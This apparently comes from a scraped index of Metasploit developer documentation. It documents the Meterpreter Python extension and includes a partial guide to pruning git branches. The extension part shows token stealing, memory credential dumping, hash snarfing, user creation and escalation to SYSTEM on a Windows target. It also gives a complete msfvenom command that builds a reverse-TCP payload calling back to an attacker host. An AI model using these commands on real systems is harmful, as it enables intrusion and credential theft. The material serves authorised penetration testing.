name of the server to use when adding the user. username - name of the user to create. password - password for the new user. meterpreter.incognito.add_group_user(server, group, username) - add a user to a group (domain). server - name of the server to use when adding the user to a group. group - name of the group to add the user to. username - name of the user to add to the group. meterpreter.incognito.add_localgroup_user(server, group, username) - add a user to a group (local). server - name of the server to use when adding the user to a group. group - name of the group to add the user to. username - name of the user to add to the group. meterpreter.kiwi (requires the kiwi extension) meterpreter.kiwi.creds_all() - matches the creds_all command from the kiwi extension and returns a full list of all credentials that can be pulled from memory. meterpreter.sys meterpreter.sys.info() - matches the sysinfo command and shows system information. meterpreter.sys.ps_list() - matches the ps command and lists the processes on the target. meterpreter.transport meterpreter.transport.list() - list all transports in the target. meterpreter.transport.add(url, session_expiry, comm_timeout, retry_total, retry_wait, ua, proxy_host, proxy_user, proxy_pass, cert_hash) - allows for transports to be added to the Meterpreter session. All but the url parameter come with a sane default. Full details of each of these parameters can be found in the transport documentation. It is not possible to delete transports using the python extension as this opens the door to many kinds of failure. meterpreter.user meterpreter.user.getuid() - gets the UID of the current session. meterpreter.user.getsid() - gets the SID of the current session. meterpreter.user.is_system() - determines if the current session is running as the SYSTEM user. Bindings example meterpreter > getuid Server username: WIN-TV01I7GG7JK\\oj meterpreter > python_execute \"import meterpreter.user; print meterpreter.user.getuid()\" [+] Content written to stdout: WIN-TV01I7GG7JK\\oj meterpreter > python_execute \"import meterpreter.elevate; meterpreter.elevate.getsystem()\" [+] Command executed without returning a result meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM meterpreter > python_execute \"meterpreter.elevate.rev2self(); print meterpreter.user.getuid()\" [+] Content written to stdout: WIN-TV01I7GG7JK\\oj meterpreter > use incognito Loading extension incognito...success. meterpreter > python_execute \"import meterpreter.incognito; print meterpreter.incognito.list_user_tokens()\" [+] Content written to stdout: {'Delegation': ['NT AUTHORITY\\\\LOCAL SERVICE', 'NT AUTHORITY\\\\NETWORK SERVICE', 'NT AUTHORITY\\\\SYSTEM', 'WIN-TV01I7GG7JK\\\\oj'], 'Impersonation': ['NT AUTHORITY\\\\ANONYMOUS LOGON']} meterpreter > python_execute \"import meterpreter.fs; print meterpreter.fs.show_mount()\" [+] Content written to stdout: [{'Name': 'A:\\\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 2}, {'Name': 'C:\\\\', 'SpaceUser': 28950585344L, 'SpaceTotal': 64422408192L, 'UNC': None, 'SpaceFree': 28950585344L, 'Type': 3}, {'Name': 'D:\\\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 5}] Each of the examples above just show the results printed to stdout, however the values are returned as Python dictionaries and can be operated on just like normal variables. Stageless Initialisation Not only can the extension be baked into a stageless Meterpreter, like any other extension, it also has the ability to run an arbitrary script before the Meterpreter session is even established! Consider the following script: $ cat /tmp/met.py import meterpreter.transport meterpreter.transport.add(\"tcp://127.0.0.1:8000\") This is a simple script that uses the Meterpreter bindings to add a new transport to the list of transports. This is executed immediately before Meterpreter attempts to create a connection back to Metasploit for the first time. The intent is to show that it's possible to add any number of transports on startup. To create a stageless payload that uses this script, we can make use of the EXTINIT parameter in msfvenom : $ msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4445 EXTENSIONS=stdapi,priv,python EXTINIT=python,/tmp/met.py -f exe -o /tmp/met-stageless.exe No platform was selected, choosing Msf::Module::Platform::Windows from the payload No Arch selected, selecting Arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 6412437 bytes Saved as: /tmp/met-stageless.exe When this payload is executed, the transport is added and shown to be present in the transport list immediately: msf exploit(handler) > [*] Meterpreter session 2 opened (172.16.52.1:4445 -> 172.16.52.247:49159) at 2015-12-13 11:06:54 +1000 msf exploit(handler) > sessions -i -1 [*] Starting interaction with 2... meterpreter > transport list Session Expiry : @ 2015-12-20 11:06:52 ID Curr URL Comms T/O Retry Total Retry Wait -- ---- --- --------- ----------- ---------- 1 tcp://127.0.0.1:8000 300 3600 10 2 * tcp://172.16.52.1:4445 300 3600 10 This stageless initialisation feature allows for long-running Python scripts to be run before Meterpreter even calls home. This is really handy in so many ways, so get creative and show us how awesome this can be. FAQ Does the extension do dynamic resolution of Python libraries at runtime? Yes. The extension has a built-in import handler that loads modules from memory. This includes modules that the user has dynamically loaded using the python_import command. If a module doesn't exist as part of the extension then resolution will fail. Down the track we may look into extending this feature so that missing libraries are uploaded on-the-fly when an import fails, but it's not known when this work will get done. When will this extension be available for other Meterpreters? We're not yet able to put a timeline on this. Is it possible to use the Python extension to run Responder? Unfortunately, no it is not. Responder makes the assumption that port 445 is available for use on the target, which is why it functions nicely on *nix systems that don't make use of this port by default. On Windows systems, port 445 is already in use by system services and hence can't be bound to. There is a Powershell-based project that aims to do the same thing as Responder, and that is called Inveigh . This utility piggy-backs of the existing SMB service, and appears to do quite a good job of stealing hashes, so it's recommended that this be used instead. Is it perfect? Hell no! But the goal is to get closer and closer to perfect as we go. It's up to you to help us improve it along the way by using it in interesting ways, and submitting bugs when it breaks. Can I suggest a feature? Please do, making good use of the Github issues feature. Better still, create a PR for one! Currently Loadable Native Libraries __future__ __phello__ _abcoll _osx_support _pyio _strptime _threading_local _weakrefset abc aifc antigravity argparse asynchat asyncore atexit audiodev base64 BaseHTTPServer Bastion bdb binhex bisect calendar cgi CGIHTTPServer cgitb chunk cmd code codecs codeop collections colorsys commands compileall compiler compiler.ast compiler.consts compiler.future compiler.misc compiler.pyassem compiler.pycodegen compiler.symbols compiler.syntax compiler.transformer compiler.visitor ConfigParser contextlib Cookie cookielib copy copy_reg cProfile csv ctypes ctypes._endian ctypes.util ctypes.wintypes decimal difflib dircache dis DocXMLRPCServer dummy_thread dummy_threading email email._parseaddr email.base64mime email.charset email.encoders email.errors email.feedparser email.generator email.header email.iterators email.message email.parser email.quoprimime email.utils email.mime email.mime.application email.mime.audio email.mime.base email.mime.image email.mime.message email.mime.multipart email.mime.nonmultipart email.mime.text encodings encodings.aliases encodings.ascii encodings.base64_codec encodings.charmap encodings.cp037 encodings.cp1006 encodings.cp1026 encodings.cp1140 encodings.cp1250 encodings.cp1251 encodings.cp1252 encodings.cp1253 encodings.cp1254 encodings.cp1255 encodings.cp1256 encodings.cp1257 encodings.cp1258 encodings.cp424 encodings.cp437 encodings.cp500 encodings.cp720 encodings.cp737 encodings.cp775 encodings.cp850 encodings.cp852 encodings.cp855 encodings.cp856 encodings.cp857 encodings.cp858 encodings.cp860 encodings.cp861 encodings.cp862 encodings.cp863 encodings.cp864 encodings.cp865 encodings.cp866 encodings.cp869 encodings.cp874 encodings.cp875 encodings.hex_codec encodings.hp_roman8 encodings.idna encodings.iso8859_1 encodings.iso8859_10 encodings.iso8859_11 encodings.iso8859_13 encodings.iso8859_14 encodings.iso8859_15 encodings.iso8859_16 encodings.iso8859_2 encodings.iso8859_3 encodings.iso8859_4 encodings.iso8859_5 encodings.iso8859_6 encodings.iso8859_7 encodings.iso8859_8 encodings.iso8859_9 encodings.koi8_r encodings.koi8_u encodings.latin_1 encodings.mac_arabic encodings.mac_centeuro encodings.mac_croatian encodings.mac_cyrillic encodings.mac_farsi encodings.mac_greek encodings.mac_iceland encodings.mac_latin2 encodings.mac_roman encodings.mac_romanian encodings.mac_turkish encodings.mbcs encodings.palmos encodings.ptcp154 encodings.punycode encodings.quopri_codec encodings.raw_unicode_escape encodings.rot_13 encodings.string_escape encodings.tis_620 encodings.undefined encodings.unicode_escape encodings.unicode_internal encodings.utf_16 encodings.utf_16_be encodings.utf_16_le encodings.utf_32 encodings.utf_32_be encodings.utf_32_le encodings.utf_7 encodings.utf_8 encodings.utf_8_sig encodings.uu_codec encodings.zlib_codec filecmp fileinput fnmatch formatter fpformat fractions ftplib functools genericpath getopt getpass gettext glob gzip hashlib heapq hmac htmlentitydefs htmllib HTMLParser httplib ihooks imaplib imghdr importlib imputil inspect io json json.decoder json.encoder json.scanner json.tool keyword linecache locale logging logging.config logging.handlers macpath macurl2path mailbox mailcap markupbase md5 meterpreter meterpreter.core meterpreter.elevate meterpreter.fs meterpreter.incognito meterpreter.kiwi meterpreter.sys meterpreter.tlv meterpreter.transport meterpreter.user meterpreter.extapi meterpreter.extapi.adsi mhlib mimetools mimetypes MimeWriter modulefinder multifile multiprocessing multiprocessing.connection multiprocessing.forking multiprocessing.heap multiprocessing.managers multiprocessing.pool multiprocessing.process multiprocessing.queues multiprocessing.reduction multiprocessing.sharedctypes multiprocessing.synchronize multiprocessing.util multiprocessing.dummy multiprocessing.dummy.connection mutex netrc new nntplib ntpath nturl2path numbers opcode optparse os os2emxpath pdb pickle pickletools pipes pkgutil platform plistlib popen2 poplib posixfile posixpath pprint profile pstats py_compile pyclbr pydoc Queue quopri random re repr rexec rfc822 rlcompleter robotparser runpy sched sets sgmllib sha shelve shlex shutil SimpleHTTPServer SimpleXMLRPCServer site smtplib sndhdr socket SocketServer sre sre_compile sre_constants sre_parse ssl stat statvfs string StringIO stringold stringprep struct subprocess sunau sunaudio symbol symtable sysconfig tabnanny tarfile telnetlib tempfile textwrap this threading timeit toaiff token tokenize trace traceback types urllib urllib2 urlparse user UserDict UserList UserString uu uuid warnings wave weakref webbrowser whichdb wsgiref wsgiref.handlers wsgiref.headers wsgiref.simple_server wsgiref.util wsgiref.validate xdrlib xml xml.dom xml.dom.domreg xml.dom.expatbuilder xml.dom.minicompat xml.dom.minidom xml.dom.NodeFilter xml.dom.pulldom xml.dom.xmlbuilder xml.etree xml.etree.ElementInclude xml.etree.ElementPath xml.etree.ElementTree xml.parsers xml.sax xml.sax._exceptions xml.sax.handler xml.sax.saxutils xml.sax.xmlreader xmllib xmlrpclib zipfile","title":"Introduction"},{"location":"dev/dark/Python-Extension/#introduction","text":"For quite some time, Meterpreter users have wanted the ability to run arbitrary scripts under the context of a session on the target machine. While Railgun gives coders the ability to execute arbitrary Win32 API calls, it doesn't really give them the ability to script the client in a single-shot. Meterpreter now has a new extension that aims to solve this problem by providing a completely in-memory Python interpreter that can load scripts, run ad-hoc python commands, and also provides bindings to Meterpreter itself. The extension comes with many (but not all ) of the built-in functionality you would expect to see in a running Python interpreter. This includes the likes of ctypes for easy automation of Win32-related functions. We've even taken steps to make this extension piggy-back onto metsrv 's copy of the SSL libraries in an effort to reduce the size of the resulting binary. This page aims to document the features, show examples of how it can be used, and answer a few common questions that come up. Unfortunately, at this point in time the extension only works inside x86 and x64 Meterpreters running on Windows targets. However, there are plans to enable this functionality on other implementations over time.","title":"Introduction"},{"location":"dev/dark/Python-Extension/#usage","text":"As with any other extension that comes with Meterpreter, loading it is very simple: meterpreter > use python Loading extension python...success. Once loaded, the help system shows the commands that come with the extension: meterpreter > help ... snip ... Python Commands =============== Command Description ------- ----------- python_execute Execute a python command string python_import Import/run a python file or module python_reset Resets/restarts the Python interpreter Each of these commands is discussed in detail below.","title":"Usage"},{"location":"dev/dark/Python-Extension/#python_execute","text":"The python_execute command is the simplest of all commands that come with the extension, and provides the means to run single-shot lines of Python code, much in the same way that the normal Python interpreter functions from the command-line when using the -c switch. The full help for the command is as follows: meterpreter > python_execute -h Usage: python_execute <python code> [-r result var name] Runs the given python string on the target. If a result is required, it should be stored in a python variable, and that variable should passed using the -r parameter. OPTIONS: -h Help banner -r <opt> Name of the variable containing the result (optional) A very simple example of this command is shown below: meterpreter > python_execute \"print 'Hi, from Meterpreter!'\" [+] Content written to stdout: Hi, from Meterpreter! Notice that any output that is written to stdout is captured by Meterpreter and returned to Metasploit so that it's visible to the user. This also happens for anything written to stderr, as shown below: meterpreter > python_execute \"x = x + 1\" [-] Content written to stderr: Traceback (most recent call last): File \"<string>\", line 1, in <module> NameError: name 'x' is not defined This handy feature now only allows users to see the output of their scripts, but it also means that any errors are completely visible too. A more interesting example can be seen below: meterpreter > python_execute \"x = [y for y in range(0, 20) if y % 5 == 0]\" [+] Command executed without returning a result The command above executes, but nothing was printed to stdout, or to stderr, and hence nothing was captured. The good thing is that the Python extension is persistant across calls. This means that after the above command is executed, x is still present in the interpreter and can be accessed with another call: meterpreter > python_execute \"print x\" [+] Content written to stdout: [0, 5, 10, 15] As useful as this is, developers may want to produce post-modules that make use of the data that a Python script has generated. Parsing stdout is not ideal in such a scenario, and hence this command provides the means for individual variables to be extracted directly using the -r paramter, as described by the help: meterpreter > python_execute \"x = [y for y in range(0, 20) if y % 5 == 0]\" -r x [+] x = [0, 5, 10, 15] Note that this command requires the first parameter to be a string that contains code that needs to be executed. However, this string can be blank, resulting in no code being executed. This means that extraction of content generated in previous calls is still possible without executing more code, or rerunning previous code snippets just to make use of the -r parameter: meterpreter > python_execute \"\" -r x [+] x = [0, 5, 10, 15] Behind the scenes, the result of the execution is a Ruby hash that contains all content written to stdout and stderr, and the content of the variable chosen using the -r parameter. Sometimes, single-line execution isn't enough, or is cumbersome. The python_import command is provided to solve this problem and allow for scripts and modules to be loaded into the target from disk.","title":"python_execute"},{"location":"dev/dark/Python-Extension/#python_import","text":"This command allows for whole modules to be loaded from the attacker's machine an uploaded to the target interpreter. The full help is shown below: meterpreter > python_import -h Usage: python_import <-f file path> [-n mod name] [-r result var name] Loads a python code file or module from disk into memory on the target. The module loader requires a path to a folder that contains the module, and the folder name will be used as the module name. Only .py files will work with modules. OPTIONS: -f <opt> Path to the file (.py, .pyc), or module directory to import -h Help banner -n <opt> Name of the module (optional, for single files only) -r <opt> Name of the variable containing the result (optional, single files only) Importing of module trees is still considered a beta feature, but we encourage you to use it where possible and keep us informed of any issues you may face. Consider the following script: $ cat /tmp/drives.py import string from ctypes import windll def get_drives(): drives = [] bitmask = windll.kernel32.GetLogicalDrives() for letter in string.uppercase: if bitmask & 1: drives.append(letter) bitmask >>= 1 return drives result = get_drives() print result The aim of this is to determine all the local logical drives and put the letters into a list. From there it prints that list to screen. The result of running the script is as follows: meterpreter > python_import -f /tmp/drives.py [*] Importing /tmp/drives.py ... [+] Content written to stdout: ['A', 'C', 'D', 'Z'] This shows that ctypes does indeed function correctly! This command is also intended to allow for recursive loading of modules from the local attacker file system, however this feature is still not yet ready for prime time and work is still actively being done on this area.","title":"python_import"},{"location":"dev/dark/Python-Extension/#python_reset","text":"It may get to a point where the content of the interpreter needs to be flushed. The python_reset command clears out all imports, libraries and global variables: meterpreter > python_execute \"x = 100\" [+] Command executed without returning a result meterpreter > python_execute \"print x\" [+] Content written to stdout: 100 meterpreter > python_reset [+] Python interpreter successfully reset meterpreter > python_execute \"print x\" [-] Content written to stderr: Traceback (most recent call last): File \"<string>\", line 1, in <module> NameError: name 'x' is not defined","title":"python_reset"},{"location":"dev/dark/Python-Extension/#meterpreter-bindings","text":"A number of bindings are available to the Python extension that allow for interaction with the Meterpreter instance itself. They are broken up into logical modules based on the functionality that they provide. Bindings are available for other extensions as well, and hence in order to use them, those extensions must be loaded. If an extension is not present, and error is thrown. As soon as an extension is loaded, the function should work. Each of the following subsections shows a module namespace that must be imported for that module to function correctly.","title":"Meterpreter Bindings"},{"location":"dev/dark/Python-Extension/#binding-list","text":"","title":"Binding list"},{"location":"dev/dark/Python-Extension/#meterpreterelevate","text":"meterpreter.elevate.getsystem() - maps directly to the getsystem command, however only attempts to use technique 1 because this is the only technique that doesn't require a binary to be uploaded. meterpreter.elevate.rev2self() - maps directly to the rev2self command. meterpreter.elevate.steal_token(pid) - provides the ability to steal a token from another process. pid - the identifier of the process to steal the token from. meterpreter.elevate.drop_token() - drops the token that was stolen using steal_token .","title":"meterpreter.elevate"},{"location":"dev/dark/Python-Extension/#meterpreterextapi-requires-the-extapi-extension","text":"Each of the following functions takes the following parameters: domain_name - the name of the domain that will be enumerated. max_results - maximum number of results (default None ). page_size - the size of the results page (default None ). The full list of available functions is as follows: meterpreter.extapi.adsi.enum_dcs(domain_name, max_results, page_size) - enumerate the domain controllers on the given domain. meterpreter.extapi.adsi.enum_users(domain_name, max_results, page_size) - enumerate users on the given domain. meterpreter.extapi.adsi.enum_group_users_nested(domain_name, group_dn, max_results, page_size) - enumerate users in the given group recursively. group_dn - The distinguished name of the group to enumerate. meterpreter.extapi.adsi.enum_computers(domain_name, max_results, page_size) - enumerate computers on the given domain. meterpreter.extapi.adsi.domain_query(domain_name, query_filter, fields, max_results, page_size) - provides a generic query mechanism to ADSI. All other functions in this library make use of this function. query_filter - the LDAP-formatted query filter for the query. fields - list of fields to extract from the query results.","title":"meterpreter.extapi (requires the extapi extension)"},{"location":"dev/dark/Python-Extension/#meterpreterfs","text":"meterpreter.fs.show_mount() - maps to the show_mount command and lists all logical drives on the target.","title":"meterpreter.fs"},{"location":"dev/dark/Python-Extension/#meterpreterincognito-requires-the-incognito-extension","text":"meterpreter.incognito.list_user_tokens() - list all available user tokens. meterpreter.incognito.list_group_tokens() - list all available group tokens. meterpreter.incognito.impersonate(user) - impersonate the given user. user - name of the user/group to impersonate in DOMAIN\\user format. meterpreter.incognito.snarf_hashes(server) - run the snarf_hashes functionality using the specified server. server - name of the server that is in place and ready to snarf the hashes. meterpreter.incognito.add_user(server, username, password) - add a user to the given server. server - name of the server to use when adding the user. username - name of the user to create. password - password for the new user. meterpreter.incognito.add_group_user(server, group, username) - add a user to a group (domain). server - name of the server to use when adding the user to a group. group - name of the group to add the user to. username - name of the user to add to the group. meterpreter.incognito.add_localgroup_user(server, group, username) - add a user to a group (local). server - name of the server to use when adding the user to a group. group - name of the group to add the user to. username - name of the user to add to the group.","title":"meterpreter.incognito (requires the incognito extension)"},{"location":"dev/dark/Python-Extension/#meterpreterkiwi-requires-the-kiwi-extension","text":"meterpreter.kiwi.creds_all() - matches the creds_all command from the kiwi extension and returns a full list of all credentials that can be pulled from memory.","title":"meterpreter.kiwi (requires the kiwi extension)"},{"location":"dev/dark/Python-Extension/#meterpretersys","text":"meterpreter.sys.info() - matches the sysinfo command and shows system information. meterpreter.sys.ps_list() - matches the ps command and lists the processes on the target.","title":"meterpreter.sys"},{"location":"dev/dark/Python-Extension/#meterpretertransport","text":"meterpreter.transport.list() - list all transports in the target. meterpreter.transport.add(url, session_expiry, comm_timeout, retry_total, retry_wait, ua, proxy_host, proxy_user, proxy_pass, cert_hash) - allows for transports to be added to the Meterpreter session. All but the url parameter come with a sane default. Full details of each of these parameters can be found in the transport documentation. It is not possible to delete transports using the python extension as this opens the door to many kinds of failure.","title":"meterpreter.transport"},{"location":"dev/dark/Python-Extension/#meterpreteruser","text":"meterpreter.user.getuid() - gets the UID of the current session. meterpreter.user.getsid() - gets the SID of the current session. meterpreter.user.is_system() - determines if the current session is running as the SYSTEM user.","title":"meterpreter.user"},{"location":"dev/dark/Python-Extension/#bindings-example","text":"meterpreter > getuid Server username: WIN-TV01I7GG7JK\\oj meterpreter > python_execute \"import meterpreter.user; print meterpreter.user.getuid()\" [+] Content written to stdout: WIN-TV01I7GG7JK\\oj meterpreter > python_execute \"import meterpreter.elevate; meterpreter.elevate.getsystem()\" [+] Command executed without returning a result meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM meterpreter > python_execute \"meterpreter.elevate.rev2self(); print meterpreter.user.getuid()\" [+] Content written to stdout: WIN-TV01I7GG7JK\\oj meterpreter > use incognito Loading extension incognito...success. meterpreter > python_execute \"import meterpreter.incognito; print meterpreter.incognito.list_user_tokens()\" [+] Content written to stdout: {'Delegation': ['NT AUTHORITY\\\\LOCAL SERVICE', 'NT AUTHORITY\\\\NETWORK SERVICE', 'NT AUTHORITY\\\\SYSTEM', 'WIN-TV01I7GG7JK\\\\oj'], 'Impersonation': ['NT AUTHORITY\\\\ANONYMOUS LOGON']} meterpreter > python_execute \"import meterpreter.fs; print meterpreter.fs.show_mount()\" [+] Content written to stdout: [{'Name': 'A:\\\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 2}, {'Name': 'C:\\\\', 'SpaceUser': 28950585344L, 'SpaceTotal': 64422408192L, 'UNC': None, 'SpaceFree': 28950585344L, 'Type': 3}, {'Name': 'D:\\\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 5}] Each of the examples above just show the results printed to stdout, however the values are returned as Python dictionaries and can be operated on just like normal variables.","title":"Bindings example"},{"location":"dev/dark/Python-Extension/#stageless-initialisation","text":"Not only can the extension be baked into a stageless Meterpreter, like any other extension, it also has the ability to run an arbitrary script before the Meterpreter session is even established! Consider the following script: $ cat /tmp/met.py import meterpreter.transport meterpreter.transport.add(\"tcp://127.0.0.1:8000\") This is a simple script that uses the Meterpreter bindings to add a new transport to the list of transports. This is executed immediately before Meterpreter attempts to create a connection back to Metasploit for the first time. The intent is to show that it's possible to add any number of transports on startup. To create a stageless payload that uses this script, we can make use of the EXTINIT parameter in msfvenom : $ msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4445 EXTENSIONS=stdapi,priv,python EXTINIT=python,/tmp/met.py -f exe -o /tmp/met-stageless.exe No platform was selected, choosing Msf::Module::Platform::Windows from the payload No Arch selected, selecting Arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 6412437 bytes Saved as: /tmp/met-stageless.exe When this payload is executed, the transport is added and shown to be present in the transport list immediately: msf exploit(handler) > [*] Meterpreter session 2 opened (172.16.52.1:4445 -> 172.16.52.247:49159) at 2015-12-13 11:06:54 +1000 msf exploit(handler) > sessions -i -1 [*] Starting interaction with 2... meterpreter > transport list Session Expiry : @ 2015-12-20 11:06:52 ID Curr URL Comms T/O Retry Total Retry Wait -- ---- --- --------- ----------- ---------- 1 tcp://127.0.0.1:8000 300 3600 10 2 * tcp://172.16.52.1:4445 300 3600 10 This stageless initialisation feature allows for long-running Python scripts to be run before Meterpreter even calls home. This is really handy in so many ways, so get creative and show us how awesome this can be.","title":"Stageless Initialisation"},{"location":"dev/dark/Python-Extension/#faq","text":"Does the extension do dynamic resolution of Python libraries at runtime? Yes. The extension has a built-in import handler that loads modules from memory. This includes modules that the user has dynamically loaded using the python_import command. If a module doesn't exist as part of the extension then resolution will fail. Down the track we may look into extending this feature so that missing libraries are uploaded on-the-fly when an import fails, but it's not known when this work will get done. When will this extension be available for other Meterpreters? We're not yet able to put a timeline on this. Is it possible to use the Python extension to run Responder? Unfortunately, no it is not. Responder makes the assumption that port 445 is available for use on the target, which is why it functions nicely on *nix systems that don't make use of this port by default. On Windows systems, port 445 is already in use by system services and hence can't be bound to. There is a Powershell-based project that aims to do the same thing as Responder, and that is called Inveigh . This utility piggy-backs of the existing SMB service, and appears to do quite a good job of stealing hashes, so it's recommended that this be used instead. Is it perfect? Hell no! But the goal is to get closer and closer to perfect as we go. It's up to you to help us improve it along the way by using it in interesting ways, and submitting bugs when it breaks. Can I suggest a feature? Please do, making good use of the Github issues feature. Better still, create a PR for one!","title":"FAQ"},{"location":"dev/dark/Python-Extension/#currently-loadable-native-libraries","text":"__future__ __phello__ _abcoll _osx_support _pyio _strptime _threading_local _weakrefset abc aifc antigravity argparse asynchat asyncore atexit audiodev base64 BaseHTTPServer Bastion bdb binhex bisect calendar cgi CGIHTTPServer cgitb chunk cmd code codecs codeop collections colorsys commands compileall compiler compiler.ast compiler.consts compiler.future compiler.misc compiler.pyassem compiler.pycodegen compiler.symbols compiler.syntax compiler.transformer compiler.visitor ConfigParser contextlib Cookie cookielib copy copy_reg cProfile csv ctypes ctypes._endian ctypes.util ctypes.wintypes decimal difflib dircache dis DocXMLRPCServer dummy_thread dummy_threading email email._parseaddr email.base64mime email.charset email.encoders email.errors email.feedparser email.generator email.header email.iterators email.message email.parser email.quoprimime email.utils email.mime email.mime.application email.mime.audio email.mime.base email.mime.image email.mime.message email.mime.multipart email.mime.nonmultipart email.mime.text encodings encodings.aliases encodings.ascii encodings.base64_codec encodings.charmap encodings.cp037 encodings.cp1006 encodings.cp1026 encodings.cp1140 encodings.cp1250 encodings.cp1251 encodings.cp1252 encodings.cp1253 encodings.cp1254 encodings.cp1255 encodings.cp1256 encodings.cp1257 encodings.cp1258 encodings.cp424 encodings.cp437 encodings.cp500 encodings.cp720 encodings.cp737 encodings.cp775 encodings.cp850 encodings.cp852 encodings.cp855 encodings.cp856 encodings.cp857 encodings.cp858 encodings.cp860 encodings.cp861 encodings.cp862 encodings.cp863 encodings.cp864 encodings.cp865 encodings.cp866 encodings.cp869 encodings.cp874 encodings.cp875 encodings.hex_codec encodings.hp_roman8 encodings.idna encodings.iso8859_1 encodings.iso8859_10 encodings.iso8859_11 encodings.iso8859_13 encodings.iso8859_14 encodings.iso8859_15 encodings.iso8859_16 encodings.iso8859_2 encodings.iso8859_3 encodings.iso8859_4 encodings.iso8859_5 encodings.iso8859_6 encodings.iso8859_7 encodings.iso8859_8 encodings.iso8859_9 encodings.koi8_r encodings.koi8_u encodings.latin_1 encodings.mac_arabic encodings.mac_centeuro encodings.mac_croatian encodings.mac_cyrillic encodings.mac_farsi encodings.mac_greek encodings.mac_iceland encodings.mac_latin2 encodings.mac_roman encodings.mac_romanian encodings.mac_turkish encodings.mbcs encodings.palmos encodings.ptcp154 encodings.punycode encodings.quopri_codec encodings.raw_unicode_escape encodings.rot_13 encodings.string_escape encodings.tis_620 encodings.undefined encodings.unicode_escape encodings.unicode_internal encodings.utf_16 encodings.utf_16_be encodings.utf_16_le encodings.utf_32 encodings.utf_32_be encodings.utf_32_le encodings.utf_7 encodings.utf_8 encodings.utf_8_sig encodings.uu_codec encodings.zlib_codec filecmp fileinput fnmatch formatter fpformat fractions ftplib functools genericpath getopt getpass gettext glob gzip hashlib heapq hmac htmlentitydefs htmllib HTMLParser httplib ihooks imaplib imghdr importlib imputil inspect io json json.decoder json.encoder json.scanner json.tool keyword linecache locale logging logging.config logging.handlers macpath macurl2path mailbox mailcap markupbase md5 meterpreter meterpreter.core meterpreter.elevate meterpreter.fs meterpreter.incognito meterpreter.kiwi meterpreter.sys meterpreter.tlv meterpreter.transport meterpreter.user meterpreter.extapi meterpreter.extapi.adsi mhlib mimetools mimetypes MimeWriter modulefinder multifile multiprocessing multiprocessing.connection multiprocessing.forking multiprocessing.heap multiprocessing.managers multiprocessing.pool multiprocessing.process multiprocessing.queues multiprocessing.reduction multiprocessing.sharedctypes multiprocessing.synchronize multiprocessing.util multiprocessing.dummy multiprocessing.dummy.connection mutex netrc new nntplib ntpath nturl2path numbers opcode optparse os os2emxpath pdb pickle pickletools pipes pkgutil platform plistlib popen2 poplib posixfile posixpath pprint profile pstats py_compile pyclbr pydoc Queue quopri random re repr rexec rfc822 rlcompleter robotparser runpy sched sets sgmllib sha shelve shlex shutil SimpleHTTPServer SimpleXMLRPCServer site smtplib sndhdr socket SocketServer sre sre_compile sre_constants sre_parse ssl stat statvfs string StringIO stringold stringprep struct subprocess sunau sunaudio symbol symtable sysconfig tabnanny tarfile telnetlib tempfile textwrap this threading timeit toaiff token tokenize trace traceback types urllib urllib2 urlparse user UserDict UserList UserString uu uuid warnings wave weakref webbrowser whichdb wsgiref wsgiref.handlers wsgiref.headers wsgiref.simple_server wsgiref.util wsgiref.validate xdrlib xml xml.dom xml.dom.domreg xml.dom.expatbuilder xml.dom.minicompat xml.dom.minidom xml.dom.NodeFilter xml.dom.pulldom xml.dom.xmlbuilder xml.etree xml.etree.ElementInclude xml.etree.ElementPath xml.etree.ElementTree xml.parsers xml.sax xml.sax._exceptions xml.sax.handler xml.sax.saxutils xml.sax.xmlreader xmllib xmlrpclib zipfile","title":"Currently Loadable Native Libraries"},{"location":"dev/dark/Remote-Branch-Pruning/","text":"Since we have a lot of people creating and merging branches on the Metasploit GitHub repository, we need to periodically get rid of old and abandoned branches. Here's my technique: Back up the repo Clone a new metasploit-framework.git repository: todb@presto:~/github/todb-r7$ git clone github_r7:rapid7/metasploit-framework.git msf-backup.git Go there and check out every remote branch we've got. That way, if you screw up and delete something important, you can add it back in later from this backup clone. todb@presto:~/github/todb-r7$ cd msf-backup.git `todb@presto:~/github/todb-r7/metasploit-framework$ for b in `git branch -r | grep -v \"HEAD -> origin\" | sed 's/^ origin\\///'`; do git checkout -b $b --track origin/$b; done Tarball it out of the way. todb@presto:~/github/todb-r7$ cd .. todb@presto:~/github$ tar zxvf msf-backup.git.tar.gz todb@presto:~/github$ rm -rf msf-backup.git Make a new clone Now, clone metasploit again. I do this because I have like 20 remotes to deal with on my \"real\" clone and I don't want to have to grep through all my origin vs non-origin stuff. mazikeen:./rapid7$ git clone github_r7:rapid7/metasploit-framework.git msf-prune Now start figuring out what branches to delete. First, wipe out anything that responds to prune. Usually that's not a lot. mazikeen:./msf-prune$ git prune remote origin Next, take a look at what's already merged and what's not. We can drop most of the merged stuff right away. mazikeen:./msf-prune$ git branch -r --merged mazikeen:./msf-prune$ git branch -r --no-merged That gives a pretty good idea of how many branches we're talking about. Start deleting old, merged branches Here's a one-liner, lightly modified from http://stackoverflow.com/questions/2514172/listing-each-branch-and-its-last-revisions-date-in-git#2514279 which lists all remote merged branches in date order. mazikeen:./msf-prune$ for k in `git branch -r --merged |grep -v \"HEAD ->\" | sed s/^..//`; do echo -e `git log -1 --pretty=format:\"%Cgreen%ci %Cblue%cr%Creset\" $k --`\\\\t\"$k\";done | sort Count off how many you want to keep at the end, do the arithmetic, and tack on another couple pipes to catch everything that's more than two weeks old. These are the merged branches that nobody's likely to miss. ` mazikeen:./msf-prune$ for k in `git branch -r --merged |grep -v \"HEAD ->\" | sed s/^..//`; do echo -e `git log -1 --pretty=format:\"%Cgreen%ci %Cblue%cr%Creset\" $k --`\\\\t\"$k\";done | sort | head -45 | sed \"s/^.*origin\\///\" > /tmp/merged_to_delete.txt Pull the trigger: mazikeen:./msf-prune$ for b in `cat /tmp/merged_to_delete.txt`; do echo Deleting $b && git push origin :$b; done Note that we still have our tarball, so if we need to reinstate any of these branches, just need to re-push. Repeat for the unmerged 